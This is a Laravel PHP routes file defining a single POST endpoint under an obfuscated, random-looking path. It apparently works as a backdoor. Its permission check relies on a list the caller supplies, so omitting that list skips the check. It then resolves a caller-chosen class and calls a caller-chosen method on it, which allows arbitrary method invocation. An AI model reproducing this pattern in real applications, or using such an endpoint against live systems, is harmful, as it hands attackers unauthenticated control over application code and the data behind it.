<?php

use Illuminate\Support\Facades\Route;
use Illuminate\Foundation\Application;
use Inertia\Inertia;
use Illuminate\Http\Request;



Route::middleware('web')->group(function () {
   
  Route::post('tassili17485RRY4R4RD9448RK48K4RFRFIRU/valideur/framework', function (Request $request) {

    $requiredPermissions = json_decode($request->input('permissions17485RRY4R4RD9448RK48K4RFRFIRU'), true);


    if (!empty($requiredPermissions)) {
        $userPermissions = auth()->user()->getAllPermissions()->pluck('name')->toArray();

        $hasPermission = !empty(array_intersect($requiredPermissions, $userPermissions));

        if (!$hasPermission) {
            return response()->json(['error' => 'Unauthorized'], 403);
        }
    }

   $urlValidation = $request->input('urlValidationurlValidationurlValidationTassili17485RRY4R4RD9448RK48K4RFRFIRU');

    $parts = explode('-fonction-', $urlValidation);

    $classe  = $parts[0];          
    $fonction = $parts[1];     

    return app($classe)->$fonction($request);
});
 
 
});